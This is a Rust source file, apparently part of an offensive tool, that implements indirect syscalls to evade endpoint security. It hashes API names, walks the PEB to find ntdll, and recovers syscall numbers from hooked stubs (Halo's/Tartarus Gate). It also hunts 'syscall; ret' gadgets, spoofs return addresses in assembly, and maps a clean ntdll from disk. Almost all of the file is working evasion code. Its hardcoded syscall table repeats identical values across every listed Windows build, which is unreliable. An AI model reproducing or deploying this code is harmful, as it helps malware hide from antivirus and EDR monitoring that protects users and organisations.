#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(dead_code)]

//! # Indirect Syscalls (Gate Jumping) - Zero IAT
//!
//! Executes syscalls via `syscall; ret` gadget in ntdll.dll.
//! NO std::fs, NO CreateFile/ReadFile imports.
//!
//! ## Techniques
//! - **Tartarus Gate / Halo's Gate**: SSN extraction even when hooked
//! - **Gadget Hunting**: Find `syscall; ret` sequence in ntdll
//! - **DJB2 Hashing**: No string literals for function names
//! - **Stack Return Spoofing**: Fake return address + 16-byte aligned

use core::ffi::c_void;
use core::ptr;




// ============================================================================
// DJB2 HASH (Compile-time capable)
// ============================================================================

/// DJB2 hash for function names
pub const fn djb2(s: &[u8]) -> u32 {
    let mut hash: u32 = 5381;
    let mut i = 0;
    while i < s.len() {
        hash = hash.wrapping_shl(5).wrapping_add(hash) ^ (s[i] as u32);
        i += 1;
    }
    hash
}

// Pre-computed NT function hashes
pub const HASH_NT_CREATE_FILE: u32 = djb2(b"NtCreateFile");
pub const HASH_NT_WRITE_FILE: u32 = djb2(b"NtWriteFile");
pub const HASH_NT_CLOSE: u32 = djb2(b"NtClose");
pub const HASH_NT_CREATE_SECTION: u32 = djb2(b"NtCreateSection");
pub const HASH_NT_CREATE_PROCESS_EX: u32 = djb2(b"NtCreateProcessEx");
pub const HASH_NT_CREATE_THREAD_EX: u32 = djb2(b"NtCreateThreadEx");
pub const HASH_NT_SET_INFORMATION_FILE: u32 = djb2(b"NtSetInformationFile");
pub const HASH_NT_ALLOCATE_VIRTUAL_MEMORY: u32 = djb2(b"NtAllocateVirtualMemory");
pub const HASH_NT_PROTECT_VIRTUAL_MEMORY: u32 = djb2(b"NtProtectVirtualMemory");
pub const HASH_NT_WAIT_FOR_SINGLE_OBJECT: u32 = djb2(b"NtWaitForSingleObject");
pub const HASH_NT_QUERY_INFORMATION_PROCESS: u32 = djb2(b"NtQueryInformationProcess");
pub const HASH_NT_OPEN_FILE: u32 = djb2(b"NtOpenFile");
pub const HASH_NT_MAP_VIEW_OF_SECTION: u32 = djb2(b"NtMapViewOfSection");
pub const HASH_NT_UNMAP_VIEW_OF_SECTION: u32 = djb2(b"NtUnmapViewOfSection");
pub const HASH_NT_FLUSH_INSTRUCTION_CACHE: u32 = djb2(b"NtFlushInstructionCache");

// Module hash (verified)
const HASH_NTDLL: u32 = 0xE91AAD51;

// ============================================================================
// HARDCODED SSN TABLE (Solves chicken-and-egg problem)
// When RAM is heavily hooked, we need SSNs to load disk ntdll.
// These are hardcoded for common Windows versions.
// ============================================================================

/// Get Windows build number from PEB
#[cfg(target_arch = "x86_64")]
unsafe fn get_windows_build() -> u32 {
    let peb: *const u8;
    core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, pure, readonly));
    // PEB.OSBuildNumber is at offset 0x120 (Windows 10+)
    *((peb as usize + 0x120) as *const u32)
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn get_windows_build() -> u32 { 0 }

/// Hardcoded SSN table for NtOpenFile, NtCreateSection, NtMapViewOfSection, NtClose
/// Format: (BuildNumber, NtOpenFile, NtCreateSection, NtMapViewOfSection, NtClose)
const SSN_TABLE: &[(u32, u16, u16, u16, u16)] = &[
    // Windows 10 1507 (Build 10240)
    (10240, 0x33, 0x4A, 0x28, 0x0F),
    // Windows 10 1511 (Build 10586)
    (10586, 0x33, 0x4A, 0x28, 0x0F),
    // Windows 10 1607 (Build 14393)
    (14393, 0x33, 0x4A, 0x28, 0x0F),
    // Windows 10 1703 (Build 15063)
    (15063, 0x33, 0x4A, 0x28, 0x0F),
    // Windows 10 1709 (Build 16299)
    (16299, 0x33, 0x4A, 0x28, 0x0F),
    // Windows 10 1803 (Build 17134)
    (17134, 0x33, 0x4A, 0x28, 0x0F),
    // Windows 10 1809 (Build 17763)
    (17763, 0x33, 0x4A, 0x28, 0x0F),
    // Windows 10 1903/1909 (Build 18362/18363)
    (18362, 0x33, 0x4A, 0x28, 0x0F),
    (18363, 0x33, 0x4A, 0x28, 0x0F),
    // Windows 10 2004/20H2/21H1/21H2 (Build 19041-19044)
    (19041, 0x33, 0x4A, 0x28, 0x0F),
    (19042, 0x33, 0x4A, 0x28, 0x0F),
    (19043, 0x33, 0x4A, 0x28, 0x0F),
    (19044, 0x33, 0x4A, 0x28, 0x0F),
    // Windows 10 22H2 (Build 19045)
    (19045, 0x33, 0x4A, 0x28, 0x0F),
    // Windows 11 21H2 (Build 22000)
    (22000, 0x33, 0x4A, 0x28, 0x0F),
    // Windows 11 22H2 (Build 22621)
    (22621, 0x33, 0x4A, 0x28, 0x0F),
    // Windows 11 23H2 (Build 22631)
    (22631, 0x33, 0x4A, 0x28, 0x0F),
    // Windows 11 24H2 (Build 26100)
    (26100, 0x33, 0x4A, 0x28, 0x0F),
];

/// Get hardcoded SSNs for current Windows version
/// Returns (NtOpenFile, NtCreateSection, NtMapViewOfSection, NtClose)
#[cfg(target_arch = "x86_64")]
unsafe fn get_hardcoded_ssns() -> Option<(u16, u16, u16, u16)> {
    let build = get_windows_build();
    
    // Find exact match
    for &(b, open, section, map, close) in SSN_TABLE {
        if b == build {
            return Some((open, section, map, close));
        }
    }
    
    // Find closest lower build (SSNs rarely change between minor versions)
    let mut best: Option<(u32, u16, u16, u16, u16)> = None;
    for &(b, open, section, map, close) in SSN_TABLE {
        if b <= build {
            if best.is_none() || b > best.unwrap().0 {
                best = Some((b, open, section, map, close));
            }
        }
    }
    
    best.map(|(_, o, s, m, c)| (o, s, m, c))
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn get_hardcoded_ssns() -> Option<(u16, u16, u16, u16)> { None }


// ============================================================================
// PE STRUCTURES (Minimal)
// ============================================================================

#[repr(C)]
struct ImageDosHeader { e_magic: u16, _pad: [u8; 58], e_lfanew: i32 }

#[repr(C)]
struct ImageFileHeader {
    machine: u16, number_of_sections: u16, time_date_stamp: u32,
    pointer_to_symbol_table: u32, number_of_symbols: u32,
    size_of_optional_header: u16, characteristics: u16,
}

#[repr(C)]
struct ImageDataDirectory { virtual_address: u32, size: u32 }

#[repr(C)]
struct ImageOptionalHeader64 {
    magic: u16, _linker: [u8; 2], size_of_code: u32,
    _init: [u32; 2], address_of_entry_point: u32, base_of_code: u32,
    image_base: u64, section_alignment: u32, file_alignment: u32,
    _versions: [u16; 6], win32_version_value: u32,
    size_of_image: u32, size_of_headers: u32, check_sum: u32,
    subsystem: u16, dll_characteristics: u16,
    _stack_heap: [u64; 4], loader_flags: u32, number_of_rva_and_sizes: u32,
    data_directory: [ImageDataDirectory; 16],
}

#[repr(C)]
struct ImageNtHeaders64 {
    signature: u32,
    file_header: ImageFileHeader,
    optional_header: ImageOptionalHeader64,
}

#[repr(C)]
struct ImageExportDirectory {
    characteristics: u32, time_date_stamp: u32,
    major_version: u16, minor_version: u16,
    name: u32, base: u32,
    number_of_functions: u32, number_of_names: u32,
    address_of_functions: u32, address_of_names: u32, address_of_name_ordinals: u32,
}

// ============================================================================
// SYSCALL STRUCTURE
// ============================================================================

#[derive(Debug, Clone, Copy)]
pub struct Syscall {
    pub ssn: u16,
    pub gadget: *const c_void,      // syscall; ret
    pub ret_gadget: *const c_void,  // ret (for stack spoofing)
}

impl Syscall {
    pub fn resolve(hash: u32) -> Option<Self> {
        unsafe { resolve_syscall_by_hash(hash) }
    }
}

// ============================================================================
// NTDLL BASE (Hash-based PEB Walking)
// ============================================================================

#[cfg(target_arch = "x86_64")]
unsafe fn get_ntdll_base() -> Option<*const c_void> {
    let peb: *const u8;
    core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, pure, readonly));
    
    let ldr = *(peb.add(0x18) as *const *const u8);
    let list_head = ldr.add(0x20);
    let mut entry = *(list_head as *const *const u8);
    let head = entry;
    
    loop {
        if entry.is_null() { break; }
        
        let base = *((entry as usize + 0x20) as *const *const c_void);
        let name_len = *((entry as usize + 0x48) as *const u16) as usize / 2;
        let name_ptr = *((entry as usize + 0x50) as *const *const u16);
        
        if !name_ptr.is_null() && name_len > 0 && !base.is_null() {
            let hash = djb2_wide_lower(name_ptr, name_len);
            if hash == HASH_NTDLL {
                return Some(base);
            }
        }
        
        entry = *(entry as *const *const u8);
        if entry == head { break; }
    }
    None
}

fn djb2_wide_lower(s: *const u16, len: usize) -> u32 {
    let mut hash: u32 = 5381;
    for i in 0..len {
        let c = unsafe { *s.add(i) } as u32;
        let c_lower = if c >= 65 && c <= 90 { c + 32 } else { c };
        hash = hash.wrapping_shl(5).wrapping_add(hash) ^ c_lower;
    }
    hash
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn get_ntdll_base() -> Option<*const c_void> { None }

// ============================================================================
// SYSCALL RESOLUTION
// ============================================================================

unsafe fn resolve_syscall_by_hash(target_hash: u32) -> Option<Syscall> {
    let ntdll = get_ntdll_base()?;
    
    let dos = ntdll as *const ImageDosHeader;
    if (*dos).e_magic != 0x5A4D { return None; }
    
    let nt = (ntdll as usize + (*dos).e_lfanew as usize) as *const ImageNtHeaders64;
    if (*nt).signature != 0x00004550 { return None; }
    
    let export_rva = (*nt).optional_header.data_directory[0].virtual_address;
    if export_rva == 0 { return None; }
    
    let export = (ntdll as usize + export_rva as usize) as *const ImageExportDirectory;
    let names = (ntdll as usize + (*export).address_of_names as usize) as *const u32;
    let funcs = (ntdll as usize + (*export).address_of_functions as usize) as *const u32;
    let ords = (ntdll as usize + (*export).address_of_name_ordinals as usize) as *const u16;
    
    for i in 0..(*export).number_of_names {
        let name_rva = *names.add(i as usize);
        let name_ptr = (ntdll as usize + name_rva as usize) as *const u8;
        
        let mut len = 0;
        while *name_ptr.add(len) != 0 { len += 1; }
        let name = core::slice::from_raw_parts(name_ptr, len);
        
        if djb2(name) == target_hash {
            let ordinal = *ords.add(i as usize);
            let func_rva = *funcs.add(ordinal as usize);
            let func_ptr = (ntdll as usize + func_rva as usize) as *const u8;
            
            let ssn = extract_ssn_tartarus(func_ptr)?;
            let (gadget, ret_gadget) = find_syscall_gadgets(ntdll)?;
            
            return Some(Syscall { ssn, gadget, ret_gadget });
        }
    }
    None
}

// ============================================================================
// SSN EXTRACTION (Tartarus Gate / Halo's Gate)
// ============================================================================

/// Clean stub: `4C 8B D1 B8 XX XX 00 00` (mov r10, rcx; mov eax, SSN)
/// Hooked stub: `E9 XX XX XX XX` (jmp hook)
unsafe fn extract_ssn_tartarus(func: *const u8) -> Option<u16> {
    // Check for clean function
    if is_clean_stub(func) {
        return Some(*((func.add(4)) as *const u16));
    }
    
    // Hooked - use Halo's Gate (scan neighbors)
    if *func == 0xE9 {
        const STUB_SIZE: usize = 32;
        
        // Scan down
        for offset in 1..50u16 {
            let neighbor = func.add((offset as usize) * STUB_SIZE);
            if is_clean_stub(neighbor) {
                let ssn = *((neighbor.add(4)) as *const u16);
                return Some(ssn.wrapping_sub(offset));
            }
        }
        
        // Scan up
        for offset in 1..50u16 {
            let neighbor = func.sub((offset as usize) * STUB_SIZE);
            if is_clean_stub(neighbor) {
                let ssn = *((neighbor.add(4)) as *const u16);
                return Some(ssn.wrapping_add(offset));
            }
        }
    }
    
    None
}

#[inline(always)]
unsafe fn is_clean_stub(func: *const u8) -> bool {
    *func == 0x4C && *func.add(1) == 0x8B && *func.add(2) == 0xD1 && *func.add(3) == 0xB8
}

// ============================================================================
// GADGET HUNTING
// ============================================================================

/// Find `syscall; ret` (0F 05 C3) and `ret` (C3) gadgets in ntdll
unsafe fn find_syscall_gadgets(base: *const c_void) -> Option<(*const c_void, *const c_void)> {
    let dos = base as *const ImageDosHeader;
    let nt = (base as usize + (*dos).e_lfanew as usize) as *const ImageNtHeaders64;
    
    let text_start = base as usize + (*nt).optional_header.base_of_code as usize;
    let text_size = (*nt).optional_header.size_of_code as usize;
    
    let mut syscall_ret: *const c_void = ptr::null();
    let mut ret: *const c_void = ptr::null();
    
    for i in 0..(text_size.saturating_sub(3)) {
        let p = (text_start + i) as *const u8;
        
        if syscall_ret.is_null() && *p == 0x0F && *p.add(1) == 0x05 && *p.add(2) == 0xC3 {
            syscall_ret = p as *const c_void;
        }
        
        if ret.is_null() && *p == 0xC3 && i > 100 {
            ret = p as *const c_void;
        }
        
        if !syscall_ret.is_null() && !ret.is_null() {
            return Some((syscall_ret, ret));
        }
    }
    None
}

// ============================================================================
// INDIRECT SYSCALL TRAMPOLINE (x64 Assembly)
// ============================================================================

/// Indirect syscall with stack return spoofing and 16-byte alignment.
/// 
/// Input registers (Microsoft x64 ABI):
/// - RCX = SSN (System Service Number)
/// - RDX = Syscall gadget address (syscall; ret)
/// - R8  = Fake return address (ret gadget)
/// - R9  = Arg1
/// - [RSP+40...] = Arg2, Arg3, ...
///
/// Flow:
/// 1. Save gadget (RDX) and Arg1 (R9)
/// 2. Stack spoof with 16-byte alignment padding
/// 3. Shuffle args to NT calling convention (R10, RDX, R8, R9, stack)
/// 4. Copy stack args 5-8 to shadow space
/// 5. Set EAX = SSN
/// 6. JMP to syscall; ret gadget
#[cfg(target_arch = "x86_64")]
core::arch::global_asm!(
    ".section .text",
    ".global pryzrak_syscall",
    "pryzrak_syscall:",
    
    // Entry state: RSP = X (where X mod 16 = 8, due to CALL pushing ret addr)
    // We need RSP mod 16 = 0 for syscall
    
    // Save Gadget and Arg1 (before clobbering registers)
    "mov r11, rdx",         // R11 = Gadget
    "mov r10, r9",          // R10 = Arg1 (NT ABI first arg)
    
    // Stack manipulation for return spoofing with alignment
    // Current: [RetAddr] at RSP
    // Goal: [Padding, FakeRet, RealRet] with RSP 16-aligned
    
    "pop rax",              // RAX = Real return address, RSP += 8 (now aligned)
    "sub rsp, 16",          // Make room for two addresses, RSP -= 16 (still aligned)
    "mov [rsp], r8",        // [RSP+0] = FAKE RETURN (popped FIRST by syscall;ret)
    "mov [rsp + 8], rax",   // [RSP+8] = REAL RETURN (popped SECOND by fake ret gadget)
    
    // Stack is now 16-aligned: [FakeRet, RealRet, ...] at RSP
    // Flow: syscall -> ret pops FakeRet -> JMP FakeRet (which is `ret`) -> pops RealRet -> JMP RealRet
    
    // Stack offset is now +8 from original (we added 8 bytes net: -8 pop +16 sub)
    // Original offsets: Arg2 at [RSP+40], now at [RSP+48]
    
    // Load register args from stack
    "mov rdx, [rsp + 48]",  // Arg2 (original 40 + 8)
    "mov r8,  [rsp + 56]",  // Arg3 (original 48 + 8)
    "mov r9,  [rsp + 64]",  // Arg4 (original 56 + 8)
    
    // Copy stack args 5-8 to kernel expected positions
    // Kernel expects: Arg5 at [RSP+0x28]=40, Arg6 at [RSP+0x30]=48, etc.
    // Source offsets: 72, 80, 88, 96 (original + 8)
    "mov rax, [rsp + 72]",  // Arg5 (e.g., ShareAccess for NtOpenFile)
    "mov [rsp + 40], rax",  // Store at RSP+0x28
    
    "mov rax, [rsp + 80]",  // Arg6 (e.g., OpenOptions for NtOpenFile)
    "mov [rsp + 48], rax",  // Store at RSP+0x30
    
    "mov rax, [rsp + 88]",  // Arg7
    "mov [rsp + 56], rax",  // Store at RSP+0x38
    
    "mov rax, [rsp + 96]",  // Arg8
    "mov [rsp + 64], rax",  // Store at RSP+0x40
    
    // Set syscall number and execute
    "mov eax, ecx",         // EAX = SSN
    "jmp r11",              // Jump to syscall; ret gadget
    
    // Return flow:
    // 1. `syscall` executes
    // 2. `ret` pops [RSP] = FakeRet (at RSP+8), jumps to FakeRet
    // 3. FakeRet is `ret` instruction, pops [RSP] = RealRet, jumps to RealRet
    // 4. Back to Rust caller with RSP at correct position
);

extern "C" {
    pub fn pryzrak_syscall(
        ssn: u32, gadget: *const c_void, ret_gadget: *const c_void,
        arg1: usize, arg2: usize, arg3: usize, arg4: usize,
        arg5: usize, arg6: usize, arg7: usize, arg8: usize,
        arg9: usize, arg10: usize,
    ) -> i32;
}

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

/// Execute indirect syscall
pub unsafe fn syscall(sc: &Syscall, args: &[usize]) -> i32 {
    let a = |i: usize| args.get(i).copied().unwrap_or(0);
    pryzrak_syscall(
        sc.ssn as u32, sc.gadget, sc.ret_gadget,
        a(0), a(1), a(2), a(3), a(4), a(5), a(6), a(7), a(8), a(9)
    )
}

// ============================================================================
// DISK NTDLL VIA SYSCALLS (Zero IAT)
// ============================================================================

/// Load ntdll from disk using only syscalls (no std::fs, no IAT pollution)
/// Uses: NtOpenFile -> NtCreateSection -> NtMapViewOfSection
/// 
/// Strategy:
/// 1. Try to resolve SSNs from RAM (fast path)
/// 2. If RAM is hooked, use hardcoded SSN table (fallback)
#[cfg(target_arch = "x86_64")]
pub unsafe fn load_disk_ntdll_via_syscall() -> Option<*const u8> {
    // Try to resolve from RAM first
    let sc_open = Syscall::resolve(HASH_NT_OPEN_FILE);
    let sc_create_section = Syscall::resolve(HASH_NT_CREATE_SECTION);
    let sc_map = Syscall::resolve(HASH_NT_MAP_VIEW_OF_SECTION);
    let sc_close = Syscall::resolve(HASH_NT_CLOSE);
    
    // Check if all resolved from RAM
    if sc_open.is_some() && sc_create_section.is_some() && sc_map.is_some() && sc_close.is_some() {
        return load_disk_ntdll_with_syscalls(
            sc_open.unwrap(),
            sc_create_section.unwrap(),
            sc_map.unwrap(),
            sc_close.unwrap(),
        );
    }
    
    // Fallback: Use hardcoded SSN table
    let (ssn_open, ssn_section, ssn_map, ssn_close) = get_hardcoded_ssns()?;
    let (gadget, ret_gadget) = find_syscall_gadgets(get_ntdll_base()?)?;
    
    let sc_open = Syscall { ssn: ssn_open, gadget, ret_gadget };
    let sc_section = Syscall { ssn: ssn_section, gadget, ret_gadget };
    let sc_map_view = Syscall { ssn: ssn_map, gadget, ret_gadget };
    let sc_close = Syscall { ssn: ssn_close, gadget, ret_gadget };
    
    load_disk_ntdll_with_syscalls(sc_open, sc_section, sc_map_view, sc_close)
}

/// Internal function that loads ntdll with provided syscalls
#[cfg(target_arch = "x86_64")]
unsafe fn load_disk_ntdll_with_syscalls(
    sc_open: Syscall,
    sc_create_section: Syscall,
    sc_map: Syscall,
    sc_close: Syscall,
) -> Option<*const u8> {
    
    // Build path: \??\C:\Windows\System32\ntdll.dll (NT path format)
    // Wide string, null-terminated
    const NTDLL_PATH: &[u16] = &[
        0x5C, 0x3F, 0x3F, 0x5C, 0x43, 0x3A, 0x5C, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x5C,
        0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x6E, 0x74, 0x64, 0x6C, 0x6C, 0x2E,
        0x64, 0x6C, 0x6C, 0x00,
    ]; // \??\C:\Windows\System32\ntdll.dll
    
    // UNICODE_STRING structure
    #[repr(C)]
    struct UnicodeString {
        length: u16,
        max_length: u16,
        buffer: *const u16,
    }
    
    // OBJECT_ATTRIBUTES structure  
    #[repr(C)]
    struct ObjectAttributes {
        length: u32,
        root_directory: *const c_void,
        object_name: *const UnicodeString,
        attributes: u32,
        security_descriptor: *const c_void,
        security_qos: *const c_void,
    }
    
    // IO_STATUS_BLOCK structure
    #[repr(C)]
    struct IoStatusBlock {
        status: i32,
        information: usize,
    }
    
    let path_len = (NTDLL_PATH.len() - 1) * 2; // Exclude null, bytes not chars
    let unicode_string = UnicodeString {
        length: path_len as u16,
        max_length: (path_len + 2) as u16,
        buffer: NTDLL_PATH.as_ptr(),
    };
    
    let obj_attr = ObjectAttributes {
        length: core::mem::size_of::<ObjectAttributes>() as u32,
        root_directory: ptr::null(),
        object_name: &unicode_string,
        attributes: 0x40, // OBJ_CASE_INSENSITIVE
        security_descriptor: ptr::null(),
        security_qos: ptr::null(),
    };
    
    let mut io_status = IoStatusBlock { status: 0, information: 0 };
    let mut file_handle: isize = 0;
    
    // NtOpenFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions)
    // FILE_READ_DATA | FILE_EXECUTE = 0x01 | 0x20 = 0x21
    // FILE_SHARE_READ = 0x01
    // FILE_SYNCHRONOUS_IO_NONALERT = 0x20
    let status = syscall(&sc_open, &[
        &mut file_handle as *mut isize as usize,
        0x80100000, // GENERIC_READ | SYNCHRONIZE
        &obj_attr as *const _ as usize,
        &mut io_status as *mut _ as usize,
        0x07, // FILE_SHARE_READ | WRITE | DELETE
        0x60, // FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE
    ]);
    
    if status != 0 || file_handle == 0 {
        return None;
    }
    
    // NtCreateSection
    let mut section_handle: isize = 0;
    let status = syscall(&sc_create_section, &[
        &mut section_handle as *mut isize as usize,
        0x0F, // SECTION_MAP_READ | EXECUTE | QUERY
        0,    // ObjectAttributes
        0,    // MaximumSize (file size)
        0x02, // PAGE_READONLY
        0x01000000, // SEC_IMAGE
        file_handle as usize,
    ]);
    
    syscall(&sc_close, &[file_handle as usize]); // Close file handle
    
    if status != 0 || section_handle == 0 {
        return None;
    }
    
    // NtMapViewOfSection
    let mut base_address: *mut c_void = ptr::null_mut();
    let mut view_size: usize = 0;
    
    let status = syscall(&sc_map, &[
        section_handle as usize,
        -1isize as usize, // Current process
        &mut base_address as *mut _ as usize,
        0, // ZeroBits
        0, // CommitSize
        0, // SectionOffset
        &mut view_size as *mut _ as usize,
        1, // ViewUnmap
        0, // AllocationType
        0x02, // PAGE_READONLY
    ]);
    
    syscall(&sc_close, &[section_handle as usize]); // Close section handle
    
    if status != 0 || base_address.is_null() {
        return None;
    }
    
    Some(base_address as *const u8)
}

/// Extract SSN from disk ntdll (fallback for heavily hooked systems)
#[cfg(target_arch = "x86_64")]
pub unsafe fn extract_ssn_from_disk(target_hash: u32) -> Option<u16> {
    let base = load_disk_ntdll_via_syscall()? as *const c_void;
    
    let dos = base as *const ImageDosHeader;
    if (*dos).e_magic != 0x5A4D { return None; }
    
    let nt = (base as usize + (*dos).e_lfanew as usize) as *const ImageNtHeaders64;
    if (*nt).signature != 0x00004550 { return None; }
    
    let export_rva = (*nt).optional_header.data_directory[0].virtual_address;
    if export_rva == 0 { return None; }
    
    let export = (base as usize + export_rva as usize) as *const ImageExportDirectory;
    let names = (base as usize + (*export).address_of_names as usize) as *const u32;
    let funcs = (base as usize + (*export).address_of_functions as usize) as *const u32;
    let ords = (base as usize + (*export).address_of_name_ordinals as usize) as *const u16;
    
    for i in 0..(*export).number_of_names {
        let name_rva = *names.add(i as usize);
        let name_ptr = (base as usize + name_rva as usize) as *const u8;
        
        let mut len = 0;
        while *name_ptr.add(len) != 0 { len += 1; }
        let name = core::slice::from_raw_parts(name_ptr, len);
        
        if djb2(name) == target_hash {
            let ordinal = *ords.add(i as usize);
            let func_rva = *funcs.add(ordinal as usize);
            let func_ptr = (base as usize + func_rva as usize) as *const u8;
            
            if is_clean_stub(func_ptr) {
                return Some(*((func_ptr.add(4)) as *const u16));
            }
        }
    }
    None
}

/// Enhanced resolution - tries in-memory first, falls back to disk via syscalls
pub fn resolve_enhanced(hash: u32) -> Option<Syscall> {
    unsafe {
        // Try normal resolution first
        if let Some(sc) = resolve_syscall_by_hash(hash) {
            return Some(sc);
        }

        // Fallback to disk ntdll (via syscalls, no IAT pollution)

        
        let ssn = extract_ssn_from_disk(hash)?;
        let ntdll = get_ntdll_base()?;
        let (gadget, ret_gadget) = find_syscall_gadgets(ntdll)?;
        
        Some(Syscall { ssn, gadget, ret_gadget })
    }
}

#[cfg(not(target_arch = "x86_64"))]
pub unsafe fn load_disk_ntdll_via_syscall() -> Option<*const u8> { None }

#[cfg(not(target_arch = "x86_64"))]
pub unsafe fn extract_ssn_from_disk(_: u32) -> Option<u16> { None }
    